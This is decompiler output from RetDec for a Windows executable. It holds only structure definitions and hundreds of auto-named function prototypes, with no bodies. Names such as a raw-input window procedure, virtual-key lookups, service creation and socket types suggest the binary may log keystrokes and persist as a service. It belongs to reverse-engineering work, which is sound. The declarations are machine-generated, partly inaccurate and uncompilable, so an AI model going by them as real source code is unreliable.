//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
//

#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <windows.h>

// ---------------- Integer Types Definitions -----------------

typedef int64_t int128_t;

// ------------------------ Structures ------------------------

struct struct1 {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
};

struct struct2 {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
};

struct WSAData {
    int16_t e0;
    int16_t e1;
    int16_t e2;
    int16_t e3;
    char * e4;
    char e5[1];
    char e6[1];
};

struct _CRYPTOAPI_BLOB {
    int32_t e0;
    char * e1;
};

struct _FILETIME {
    int32_t e0;
    int32_t e1;
};

struct _LARGE_INTEGER {
    int64_t e0;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * e0;
    struct _LIST_ENTRY * e1;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * e0;
    struct _LIST_ENTRY * e1;
};

struct _LUID {
    int32_t e0;
    int32_t e1;
};

struct _LUID_AND_ATTRIBUTES {
    struct _LUID e0;
    int32_t e1;
};

struct _MEMORYSTATUSEX {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
};

struct _MEMORY_BASIC_INFORMATION {
    int32_t * e0;
    int32_t * e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
};

struct _OVERLAPPED {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
};

struct _PROCESS_INFORMATION {
    int32_t * e0;
    int32_t * e1;
    int32_t e2;
    int32_t e3;
};

struct _QUERY_SERVICE_CONFIGW {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int16_t * e3;
    int16_t * e4;
    int32_t e5;
    int16_t * e6;
    int16_t * e7;
    int16_t * e8;
};

struct _RTL_CRITICAL_SECTION {
    struct _RTL_CRITICAL_SECTION_DEBUG * e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
    int32_t * e4;
    int32_t e5;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    int16_t e0;
    int16_t e1;
    struct _RTL_CRITICAL_SECTION * e2;
    struct _LIST_ENTRY e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int16_t e7;
    int16_t e8;
};

struct _SECURITY_ATTRIBUTES {
    int32_t e0;
    int32_t * e1;
    bool e2;
};

struct _SHFILEOPSTRUCTW {
    int32_t * e0;
    int32_t e1;
    int16_t * e2;
    int16_t * e3;
    int16_t e4;
    bool e5;
    int32_t * e6;
    int16_t * e7;
};

struct _SID_IDENTIFIER_AUTHORITY {
    char e0[6];
};

struct _STARTUPINFOA {
    int32_t e0;
    char * e1;
    char * e2;
    char * e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    int32_t e9;
    int32_t e10;
    int32_t e11;
    int16_t e12;
    int16_t e13;
    char * e14;
    int32_t * e15;
    int32_t * e16;
    int32_t * e17;
};

struct _STARTUPINFOW {
    int32_t e0;
    int16_t * e1;
    int16_t * e2;
    int16_t * e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    int32_t e9;
    int32_t e10;
    int32_t e11;
    int16_t e12;
    int16_t e13;
    char * e14;
    int32_t * e15;
    int32_t * e16;
    int32_t * e17;
};

struct _SYSTEMTIME {
    int16_t e0;
    int16_t e1;
    int16_t e2;
    int16_t e3;
    int16_t e4;
    int16_t e5;
    int16_t e6;
    int16_t e7;
};

struct _TOKEN_PRIVILEGES {
    int32_t e0;
    struct _LUID_AND_ATTRIBUTES e1[1];
};

struct _WIN32_FIND_DATAA {
    int32_t e0;
    struct _FILETIME e1;
    struct _FILETIME e2;
    struct _FILETIME e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    char e8[1];
    char e9[14];
    int32_t e10;
    int32_t e11;
    int16_t e12;
};

struct _WIN32_FIND_DATAW {
    int32_t e0;
    struct _FILETIME e1;
    struct _FILETIME e2;
    struct _FILETIME e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int16_t e8[1];
    int16_t e9[14];
    int32_t e10;
    int32_t e11;
    int16_t e12;
};

struct _WSABUF {
    int32_t e0;
    char * e1;
};

struct _WS_DATETIME {
    int32_t e0;
    int32_t e1;
};

struct _flowspec {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
};

struct _QualityOfService {
    struct _flowspec e0;
    struct _flowspec e1;
    struct _WSABUF e2;
};

struct addrinfo {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    char * e5;
    struct sockaddr * e6;
    struct addrinfo * e7;
};

struct hostent {
    char * e0;
    char ** e1;
    int16_t e2;
    int16_t e3;
    char ** e4;
};

struct sockaddr {
    int16_t e0;
    char e1[14];
};

struct tagLASTINPUTINFO {
    int32_t e0;
    int32_t e1;
};

struct tagPOINT {
    int32_t e0;
    int32_t e1;
};

struct tagMSG {
    int32_t * e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    struct tagPOINT e5;
};

struct tagPROCESSENTRY32 {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    char e9[1];
};

struct tagPROCESSENTRY32W {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    int16_t e9[1];
};

struct tagRAWINPUTDEVICE {
    int16_t e0;
    int16_t e1;
    int32_t e2;
    int32_t * e3;
};

struct tagWNDCLASSW {
    int32_t e0;
    int32_t (*e1)(int32_t *, int32_t, int32_t, int32_t);
    int32_t e2;
    int32_t e3;
    int32_t * e4;
    int32_t * e5;
    int32_t * e6;
    int32_t * e7;
    int16_t * e8;
    int16_t * e9;
};

// ------------------- Function Prototypes --------------------

int32_t entry_point(void);
int32_t function_401000(int32_t a1);
int32_t function_401014(int32_t a1);
int32_t function_401028(int32_t result);
int32_t function_401032(void);
int32_t function_401050(int32_t a1, int32_t a2);
int32_t function_40107e(int32_t a1, int32_t a2);
int32_t function_401098(int32_t result, int16_t * a2);
int32_t function_401100(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_401140(uint32_t a1, uint32_t a2, uint32_t a3, int32_t a4);
int32_t function_4011b0(uint32_t a1, uint32_t a2, uint32_t a3, int32_t a4);
int32_t function_401230(int32_t result);
int32_t function_40126d(int32_t * a1, int32_t * a2, int32_t a3);
int32_t function_401293(int32_t * a1, int32_t a2, uint32_t a3);
int32_t function_4012c6(void);
int32_t function_4012e8(void);
int32_t function_4012f7(void);
int32_t function_401306(void);
int32_t function_401315(void);
int32_t function_401324(void);
int32_t function_401333(void);
int32_t function_401355(void);
int32_t function_401364(void);
int32_t function_401379(void);
int32_t function_40139b(unsigned char a1);
int32_t function_4013b9(unsigned char a1);
int32_t function_4013d7(void);
int32_t function_4013fd(void);
int32_t function_401419(int32_t * a1);
int32_t function_401460(void);
int32_t function_40147b(int32_t * a1);
int32_t function_4014c2(void);
int32_t function_4014dd(int32_t * a1);
int32_t function_401524(void);
int32_t function_40153f(int32_t * a1);
int32_t function_401586(void);
int32_t function_4015a1(void);
int32_t function_4015d4(void);
int32_t function_4015fb(void);
int32_t function_401618(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_401719(void);
int32_t function_401766(int32_t result, uint32_t a2);
int32_t function_4017a5(int32_t a1);
int32_t function_4018ac(void);
int32_t function_4018fe(int32_t result, uint32_t a2);
int32_t function_40193f(int32_t a1, int32_t a2, int32_t a3);
int32_t function_401a34(void);
int32_t function_401a81(int32_t result, int32_t a2);
int32_t function_401abc(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_401bbd(void);
int32_t function_401c0a(int32_t result, int32_t a2);
int32_t function_401c4b(void);
int32_t function_401c7a(void);
int32_t function_401cab(void);
int32_t function_401cdf(void);
int32_t function_401d0e(void);
int32_t function_401d40(void);
int32_t function_401d72(unsigned char a1);
int32_t function_401d91(unsigned char a1);
int32_t function_401db0(unsigned char a1);
int32_t function_401dcf(unsigned char a1);
int32_t function_401ded(unsigned char a1);
int32_t function_401e0b(unsigned char a1);
int32_t function_401e29(unsigned char a1);
int32_t function_401e48(unsigned char a1);
int32_t function_401e66(unsigned char a1);
int32_t function_401e84(unsigned char a1);
int32_t function_401ea3(unsigned char a1);
int32_t function_401ec1(unsigned char a1);
int32_t function_401edf(unsigned char a1);
int32_t function_401efd(unsigned char a1);
int32_t function_401f1b(unsigned char a1);
int32_t function_401f39(unsigned char a1);
int32_t function_401f57(unsigned char a1);
int32_t function_401f75(unsigned char a1);
int32_t function_401f93(unsigned char a1);
int32_t function_401fb1(unsigned char a1);
int32_t function_401fd0(int32_t * a1);
int32_t function_40200b(unsigned char a1);
int32_t function_40202a(unsigned char a1);
int32_t function_402052(unsigned char a1);
int32_t function_402070(unsigned char a1);
int32_t function_40208e(unsigned char a1);
int32_t function_4020ac(unsigned char a1);
int32_t function_4020ca(unsigned char a1);
int32_t function_4020e8(unsigned char a1);
int32_t function_402106(unsigned char a1);
int32_t function_402125(uint32_t a1);
int32_t function_40214a(void);
int32_t function_402152(uint32_t a1);
int32_t function_402171(void);
int32_t function_402179(uint32_t a1);
int32_t function_40219e(void);
int32_t function_4021a6(unsigned char a1);
int32_t function_4021c5(unsigned char a1);
int32_t function_4021e3(unsigned char a1);
int32_t function_402202(unsigned char a1);
int32_t function_402220(unsigned char a1);
int32_t function_40223f(unsigned char a1);
int32_t function_40225e(unsigned char a1);
int32_t function_40227d(unsigned char a1);
int32_t function_40229c(unsigned char a1);
int32_t function_4022bb(unsigned char a1);
int32_t function_4022da(unsigned char a1);
int32_t function_4022f8(void);
int32_t function_402313(unsigned char a1);
int32_t function_402332(unsigned char a1);
int32_t function_402351(unsigned char a1);
int32_t function_40236f(unsigned char a1);
int32_t function_40238e(int32_t a1);
int32_t function_402453(void);
int32_t function_40246e(int32_t a1);
int32_t function_402489(void);
int32_t function_4024bb(int32_t a1);
int32_t function_402612(int32_t a1);
int32_t function_4026c6(void);
int32_t function_4026e3(void);
int32_t function_402727(void);
int32_t function_402746(int32_t lpStartAddress, int32_t * lpParameter);
int32_t function_402771(void);
int32_t function_402790(int32_t a1);
int32_t function_4027c6(int32_t a1);
int32_t function_402820(void);
int32_t function_40283b(void);
int32_t function_402917(int32_t a1);
int32_t function_40295e(void);
int32_t function_402979(int32_t a1);
int32_t function_4029af(void);
int32_t function_402a03(int32_t result, int32_t a2);
int32_t function_402a2f(int32_t dwMilliseconds);
int32_t function_402a5c(int32_t a1);
int32_t function_402b12(void);
int32_t function_402b2d(void);
int32_t function_402b5d(unsigned char a1);
int32_t function_402b7b(void);
int32_t function_402c80(int32_t result, int32_t a2);
int32_t function_402cac(int32_t a1);
int32_t function_402d67(unsigned char a1);
int32_t function_402d86(void);
int32_t function_402da0(int32_t result);
int32_t function_402e04(int32_t a1);
int32_t function_402eaf(void);
int32_t function_402ec3(unsigned char a1);
int32_t function_402ee2(unsigned char a1);
int32_t function_402f01(unsigned char a1);
int32_t function_402f20(unsigned char a1);
int32_t function_402f3f(unsigned char a1);
int32_t function_402f5e(unsigned char a1);
int32_t function_402f7c(unsigned char a1);
int32_t function_402f9a(void);
int32_t function_402fbc(unsigned char a1);
int32_t function_402fda(unsigned char a1);
int32_t function_402ff8(int32_t result);
int32_t function_4030ea(void);
int32_t function_4030f1(int32_t a1, int32_t a2, int32_t a3);
int32_t function_403112(int32_t a1);
int32_t function_403123(void);
int32_t function_40312a(void);
int32_t function_403137(void);
int32_t function_40313a(void);
int32_t function_403142(void);
int32_t function_40314b(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4034d1(void);
int32_t function_40353f(int32_t a1, int32_t a2, int32_t a3);
int32_t function_403556(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40358c(int32_t a1);
int32_t function_4035c9(void);
int32_t function_4035cc(int32_t a1);
int32_t function_40365e(void);
int32_t function_403661(void);
int32_t function_40366b(int32_t a1);
int32_t function_4036cd(void);
int32_t function_4036d8(void);
int32_t function_4036df(void);
int32_t function_4036ea(int32_t a1);
int32_t function_4037d5(void);
int32_t function_4037dd(void);
int32_t function_4037e6(int32_t a1, int32_t a2, int32_t a3);
int32_t function_403978(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40397f(void);
int32_t function_4039a2(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4039b9(void);
int32_t function_4039be(void);
int32_t function_4039ca(void);
int32_t function_403a14(void);
int32_t function_403a31(int32_t a1, int32_t a2, int32_t a3);
int32_t function_403ac2(void);
int32_t function_403b17(int32_t a1, int32_t a2, int32_t a3);
int32_t function_403bb2(void);
int32_t function_403c13(void);
int32_t function_403c2a(void);
int32_t function_403c7f(void);
int32_t function_403cc8(void);
int32_t function_403d11(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_403e6b(void);
int32_t function_403e73(int32_t a1);
int32_t function_403e83(int32_t * a1, int32_t a2, int32_t a3);
int32_t function_403eca(int32_t a1);
int32_t function_403f05(int32_t result);
int32_t function_403f58(int32_t result);
int32_t function_403fa3(void);
int32_t function_403fb5(void);
int32_t function_403fc7(int32_t a1, int32_t a2);
int32_t function_403ffa(void);
int32_t function_404011(int32_t a1);
int32_t function_40403b(int32_t a1);
int32_t function_404065(void);
int32_t function_40406f(void);
int32_t function_404072(int32_t a1);
int32_t function_404081(void);
int32_t function_404094(int32_t a1);
int32_t function_4040c4(void);
int32_t function_4040d5(int32_t * a1);
int32_t function_40415d(int32_t a1);
int32_t function_404197(void);
int32_t function_4041c2(int32_t a1);
int32_t function_4041fb(void);
int32_t function_404201(void);
int32_t function_40424e(int32_t result);
int32_t function_404276(int32_t a1);
int32_t function_40428f(int32_t a1);
int32_t function_4042c5(int32_t a1);
int32_t function_404302(void);
int32_t function_404314(void);
int32_t function_40432c(void);
int32_t function_404333(int32_t a1);
int32_t function_40434c(void);
int32_t function_40434f(char * lpString);
int32_t function_404385(int32_t a1);
int32_t function_4043b8(void);
int32_t function_4043c7(int32_t a1);
int32_t function_4043fa(int16_t * a1);
int32_t function_404422(char * a1);
int32_t function_404462(int32_t a1);
int32_t function_404477(int32_t a1);
int32_t function_4044c4(void);
int32_t function_40453a(int32_t * a1);
int32_t function_40455a(int32_t result);
int32_t function_40456d(int32_t * a1);
int32_t function_4045f0(void);
int32_t function_404601(void);
int32_t function_404604(void);
int32_t function_40460a(int16_t * lpString);
int32_t function_404656(int32_t a1);
int32_t function_40468e(int32_t a1);
int32_t function_4046a9(int32_t a1);
int32_t function_4046c6(void);
int32_t function_4046da(int32_t result);
int32_t function_404740(int32_t a1, int32_t a2);
int32_t function_404767(int32_t a1);
int32_t function_404788(int32_t a1);
int32_t function_4047c6(int32_t a1);
int32_t function_4047e5(int32_t a1, int32_t a2);
int32_t function_4047fc(int32_t a1);
int32_t function_40482b(void);
int32_t function_404838(int32_t a1);
int32_t function_404867(int32_t a1, int32_t a2);
int32_t function_40487e(void);
int32_t function_40488b(int32_t a1, int32_t a2);
int32_t function_4048a2(int32_t a1);
int32_t function_4048d9(void);
int32_t function_4048e6(int32_t a1);
int32_t function_4048f7(void);
int32_t function_4048fe(void);
int32_t function_404907(void);
int32_t function_40490b(void);
int32_t function_40490e(void);
int32_t function_404915(void);
int32_t function_404918(void);
int32_t function_40491f(void);
int32_t function_404928(int32_t a1);
int32_t function_40496c(int32_t a1, int32_t a2);
int32_t function_40497a(void);
int32_t function_40498b(void);
int32_t function_404992(int32_t a1);
int32_t function_4049a3(void);
int32_t function_4049ac(void);
int32_t function_4049af(void);
int32_t function_4049b6(void);
int32_t function_4049bf(int32_t a1);
int32_t function_4049ee(void);
int32_t function_4049fb(void);
int32_t function_404a12(int32_t a1);
int32_t function_404a39(void);
int32_t function_404a40(void);
int32_t function_404a43(void);
int32_t function_404a4c(void);
int32_t function_404a53(void);
int32_t function_404a56(void);
int32_t function_404a5f(void);
int32_t function_404a62(void);
int32_t function_404a69(void);
int32_t function_404a72(void);
int32_t function_404a75(void);
int32_t function_404a7c(void);
int32_t function_404a85(void);
int32_t function_404a88(void);
int32_t function_404a8f(void);
int32_t function_404a98(void);
int32_t function_404a9b(void);
int32_t function_404aa2(void);
int32_t function_404aab(int32_t result);
int32_t function_404ae7(void);
int32_t function_404aee(int32_t a1);
int32_t function_404b03(int32_t a1);
int32_t function_404b14(void);
int32_t function_404b1b(void);
int32_t function_404b24(void);
int32_t function_404b28(void);
int32_t function_404b2b(void);
int32_t function_404b32(void);
int32_t function_404b3b(int32_t result);
int32_t function_404c0e(void);
int32_t function_404c2d(int32_t a1, int32_t a2);
int32_t function_404c8f(int32_t a1);
int32_t function_404ccf(int32_t a1, int32_t a2);
int32_t function_404cdd(void);
int32_t function_404cee(void);
int32_t function_404cfc(int32_t a1);
int32_t function_404d40(void);
int32_t function_404d4d(void);
int32_t function_404d50(void);
int32_t function_404d57(void);
int32_t function_404d60(void);
int32_t function_404d63(void);
int32_t function_404d6a(void);
int32_t function_404d73(int32_t a1);
int32_t function_404d84(void);
int32_t function_404d8b(void);
int32_t function_404d94(void);
int32_t function_404d98(void);
int32_t function_404d9b(void);
int32_t function_404da2(void);
int32_t function_404dab(void);
int32_t function_404dae(void);
int32_t function_404db5(void);
int32_t function_404dbe(void);
int32_t function_404dc1(void);
int32_t function_404dc8(void);
int32_t function_404dd1(int32_t a1);
int32_t function_404e54(void);
int32_t function_404e73(void);
int32_t function_404e87(int32_t a1);
int32_t function_404e98(int32_t result);
int32_t function_404eca(void);
int32_t function_404ed8(void);
int32_t function_404ee8(int32_t a1);
int32_t function_404f18(int32_t result);
int32_t function_404f63(int32_t a1, int32_t a2);
int32_t function_404f78(void);
int32_t function_404f90(void);
int32_t function_404f93(int32_t result);
int32_t function_404fc5(void);
int32_t function_404fd3(void);
int32_t function_404fe3(int32_t result);
int32_t function_40502e(void);
int32_t function_405045(int32_t a1, int32_t a2);
int32_t function_405072(int32_t result);
int32_t function_4050ae(void);
int32_t function_4050b5(int32_t a1);
int32_t function_4050ca(void);
int32_t function_4050e1(int32_t result);
int32_t function_405168(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t function_4051b9(int32_t result);
int32_t function_4051ca(void);
int32_t function_4051d1(int32_t result);
int32_t function_40527a(void);
int32_t function_4052bc(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10);
int32_t function_405363(int32_t result);
int32_t function_4053ae(void);
int32_t function_4053c5(int32_t a1, int32_t a2);
int32_t function_4053f2(int32_t result);
int32_t function_4054ac(int32_t a1, int32_t a2);
int32_t function_4054ba(void);
int32_t function_4054e1(int32_t result);
int32_t function_405580(int32_t a1, int32_t a2);
int32_t function_40558e(void);
int32_t function_4055b5(int32_t result);
int32_t function_40566f(int32_t a1, int32_t a2);
int32_t function_40567d(void);
int32_t function_4056a4(int32_t result);
int32_t function_40579a(int32_t a1, int32_t a2);
int32_t function_4057a8(void);
int32_t function_4057cf(int32_t result);
int32_t function_40586e(void);
int32_t function_405875(void);
int32_t function_40587e(int32_t result);
int32_t function_405966(void);
int32_t function_405980(int32_t a1, int32_t a2);
int32_t function_4059d7(void);
int32_t function_4059ee(int32_t result);
int32_t function_405a39(int32_t a1);
int32_t function_405a67(int32_t result);
int32_t function_405ab4(void);
int32_t function_405abb(int32_t a1);
int32_t function_405ad0(int32_t result);
int32_t function_405b26(void);
int32_t function_405b49(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405b78(void);
int32_t function_405ba0(void);
int32_t function_405bc2(int32_t a1, int32_t a2);
int32_t function_405e61(void);
int32_t function_405ef2(int32_t * a1, int32_t * a2);
int32_t function_405f32(int32_t * a1);
int32_t function_405f5d(void);
int32_t function_405f6c(int32_t a1);
int32_t function_4065c3(void);
int32_t function_4065d1(void);
int32_t function_4065fd(void);
int32_t function_40661e(int32_t a1);
int32_t function_4066a8(int32_t a1);
int32_t function_406871(int32_t a1, int32_t host_short);
int32_t function_40696e(void);
int32_t function_4069a9(int32_t * a1);
int32_t function_4069f6(int32_t * a1);
int32_t function_406a4e(void);
int32_t function_406a52(void);
int32_t function_406a56(void);
int32_t function_406a5a(int32_t result);
int32_t function_406a70(int32_t result);
int32_t function_406a86(void);
int32_t function_406a8a(void);
int32_t function_406a8e(int32_t result);
int32_t function_406aa4(void);
int32_t function_406aa8(void);
int32_t function_406ca5(void);
int32_t function_406ccd(void);
int32_t function_406d27(void);
int32_t function_406d2b(void);
int32_t function_406d2f(int32_t * a1);
int32_t function_406d50(void);
int32_t function_406d65(void);
int32_t function_406df1(void);
int32_t function_406e06(void);
int32_t function_406e1e(void);
int32_t function_406e38(void);
int32_t function_406e5c(void);
int32_t function_406e6d(void);
int32_t function_406e8d(void);
int32_t function_406ebe(void);
int32_t function_406f1d(void);
int32_t function_406f2c(void);
int32_t function_406f3d(void);
int32_t function_406f66(void);
int32_t function_406f77(void);
int32_t function_406f88(void);
int32_t function_406f8d(void);
int32_t function_406fa2(void);
int32_t function_406fa7(void);
int32_t function_406fb8(void);
int32_t function_406fbd(void);
int32_t function_406fc2(void);
int32_t function_406ff9(void);
int32_t function_406ffc(void);
int32_t function_40702c(int32_t result, int32_t a2);
int32_t function_40709b(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_4070ea(int32_t a1);
int32_t function_40726f(void);
int32_t function_40734c(void);
int32_t function_40735b(void);
int32_t function_407384(void);
int32_t function_4073bd(void);
int32_t function_4073ef(void);
int32_t function_407458(void);
int32_t function_4074b0(void);
int32_t function_4074fc(int32_t a1);
int32_t function_407512(int32_t a1, int32_t a2, int32_t a3);
int32_t function_407607(void);
int32_t function_407641(void);
int32_t function_4076c6(int32_t a1);
int32_t function_407738(int32_t a1);
int32_t function_4077b4(void);
int32_t function_407804(void);
int32_t function_40783e(int32_t a1);
int32_t function_4078a0(int32_t a1, int32_t a2);
int32_t function_407ba2(uint32_t a1);
int32_t function_407c27(int32_t a1, int32_t a2);
int32_t function_407ca5(int32_t a1);
int32_t function_407d2d(void);
int32_t function_407d57(void);
int32_t function_407d69(void);
int32_t function_407d95(void);
int32_t function_407dae(void);
int32_t function_407dc4(void);
int32_t function_407dd5(void);
int32_t function_407e03(void);
int32_t function_407e36(void);
int32_t function_407e70(int32_t * a1, int32_t a2, uint32_t a3, int32_t * a4);
int32_t function_4080d0(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_408179(void);
int32_t function_40820b(int16_t a1, char a2);
int32_t function_408316(void);
int32_t function_4083af(char a1);
int32_t function_40844f(void);
int32_t function_40847a(void);
int32_t function_409554(int32_t a1);
int32_t function_409597(void);
int32_t function_4095aa(int32_t a1);
int32_t function_409796(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4098eb(int32_t a1, int32_t a2);
int32_t function_4099d9(void);
int32_t function_409a0e(void);
int32_t function_409a31(void);
int32_t function_409a3f(uint32_t a1, int32_t a2);
int32_t function_409ab4(int32_t a1);
int32_t function_409b57(void);
int32_t function_409bff(int32_t dwProcessId);
int32_t function_409cef(int32_t a1);
int32_t function_409df9(int32_t a1, int32_t a2);
int32_t function_409e8d(int32_t a1);
int32_t function_409eee(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40a2ab(void);
int32_t function_40a2d1(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40a59d(void);
int32_t function_40a5b9(int32_t a1);
int32_t function_40a5d0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40a5db(int32_t a1, int32_t result);
int32_t function_40a61a(int32_t a1);
int32_t function_40a662(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40a667(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40a6de(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40a7c6(void);
int32_t function_40a840(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40a845(int32_t a1, int32_t * a2, char a3, int32_t a4);
int32_t function_40a8ab(int32_t a1, int32_t a2, int32_t a3, int32_t * a4);
int32_t function_40a95a(void);
int32_t function_40a976(int32_t a1, int32_t a2);
int32_t function_40aa22(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40aacd(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40ab70(void);
int32_t function_40acf4(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40ad09(int32_t a1);
int32_t function_40b155(void);
int16_t function_40b167(int32_t nVirtKey);
int32_t function_40b172(void);
int32_t function_40b347(int32_t hWnd, int32_t Msg, int32_t wParam, int32_t hRawInput);
int32_t function_40b778(void);
int32_t function_40b8c7(void);
int32_t function_40ba2c(int32_t a1);
int32_t function_40bcbb(void);
int32_t function_40bcc7(void);
int32_t function_40bd1d(int32_t a1);
int32_t function_40bd63(int32_t a1, int32_t a2);
int32_t function_40be01(void);
int32_t function_40be9b(void);
int32_t function_40bed1(void);
int32_t function_40bed9(int32_t a1);
int32_t function_40bf25(int32_t a1);
int32_t function_40bf5b(void);
int32_t function_40bf63(void);
int32_t function_40bf94(int32_t lpFileName);
int32_t function_40c237(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40c293(int32_t a1);
int32_t function_40c354(void);
int32_t function_40c38d(int32_t a1, int32_t a2);
int32_t function_40c40c(void);
int32_t function_40c446(void);
int32_t function_40c44e(void);
int32_t function_40c469(void);
int32_t function_40c475(void);
int32_t function_40c73a(void);
int32_t function_40c8fc(int32_t hKey);
int32_t function_40cc6b(uint32_t a1);
int32_t function_40cd01(int32_t a1);
int32_t function_40d379(int32_t a1);
int32_t function_40da6a(int32_t a1, int32_t a2);
int32_t function_40db12(void);
int32_t function_40de44(void);
bool function_40de6b(int32_t * hLibModule);
int32_t function_40de78(void);
int32_t function_40df46(void);
int32_t function_40df9d(int32_t lpPathName);
int32_t function_40e2da(void);
int32_t function_40e331(int32_t a1, int32_t a2);
int32_t function_40eb8e(void);
int32_t function_40ec28(int32_t a1);
int32_t function_40efe7(void);
int32_t function_40eff2(int32_t a1);
int32_t function_40f480(int32_t ** a1, int32_t ** a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_40fb4b(int32_t ** a1, int32_t ** a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_4100de(void);
int32_t function_410163(void);
int32_t function_410170(int32_t result, int32_t a2);
int32_t function_4101de(void);
int32_t function_410210(int32_t a1);
int32_t function_410249(int32_t a1);
int32_t function_4102a4(void);
int32_t function_41035f(int32_t a1, int32_t a2);
int32_t function_4103e4(int32_t * a1, int32_t * a2);
int32_t function_410468(int32_t dwFlags, int32_t a2, int32_t a3);
int32_t function_4104d3(void);
int32_t function_410514(int32_t * nNumberOfBytesToRead);
int32_t function_4105c0(int32_t * pcbBinary);
int32_t function_410620(int32_t a1);
int32_t function_410680(void);
int32_t function_4106b1(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_41079b(int32_t uBytes, int32_t a2);
int32_t function_4107d1(void);
int32_t function_410827(int32_t a1, int32_t a2);
int32_t function_4108a6(int32_t a1, int32_t a2);
int32_t function_4109fb(int32_t a1);
int32_t function_410a68(int32_t a1);
int32_t function_410ad5(int32_t a1);
int32_t function_410bf5(int32_t a1);
int32_t function_410c08(int32_t a1);
int32_t function_410c44(void);
int32_t function_410c8a(void);
int32_t function_410cce(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_410d4b(void);
int32_t function_410d7a(int32_t a1, int32_t a2);
int32_t function_410df8(int32_t lpServiceName, int32_t dwStartType);
int32_t function_410e64(int32_t lpServiceName);
int32_t function_410ee9(int32_t * lpServiceName);
int32_t function_410f97(int32_t a1);
int32_t function_41141f(void);
int32_t function_4114f4(void);
int32_t function_4116e4(void);
int32_t function_411747(void);
int32_t function_411760(void);
int32_t function_411906(void);
int32_t function_41199f(void);
int32_t function_411a69(int32_t a1);
int32_t function_411eb2(int32_t a1);
int32_t function_411ec1(void);
int32_t function_411f55(int32_t a1);
int32_t function_4120e9(int32_t a1, int32_t a2);
int32_t function_41237d(void);
int32_t function_41254e(int32_t lpApplicationName, int32_t a2, int32_t a3, int32_t a4);
int32_t function_4125c5(int32_t a1);
int32_t function_4125d4(int32_t a1);
int32_t function_4125e3(void);
int32_t function_4125ea(int32_t a1);
int32_t function_412657(void);
int32_t function_412798(void);
int32_t function_41280c(int32_t a1);
int32_t function_412a13(void);
int32_t function_412a28(void);
int32_t function_412a57(int32_t lpBuffer);
int32_t function_412aa5(int32_t a1);
int32_t function_412ae1(int32_t a1);
int32_t function_412b1d(void);
int32_t function_412b24(void);
int32_t function_412b2a(void);
int32_t function_412b3b(int32_t a1);
int32_t function_412b85(void);
int32_t function_412ba8(int32_t a1, int32_t a2);
int32_t function_412bbd(void);
int32_t function_412bca(int32_t a1);
int32_t function_412c20(void);
int32_t function_412cd5(void);
int32_t function_412ecc(int32_t result);
int32_t function_412f38(int16_t a1, char a2);
int32_t function_412f8a(int32_t result);
int32_t function_413068(void);
int32_t function_4130de(void);
int32_t function_413153(int32_t a1);
int32_t function_4131a1(void);
int32_t function_4131a4(void);
int32_t function_4131f8(void);
int32_t function_413248(int32_t a1);
int32_t function_4132f4(void);
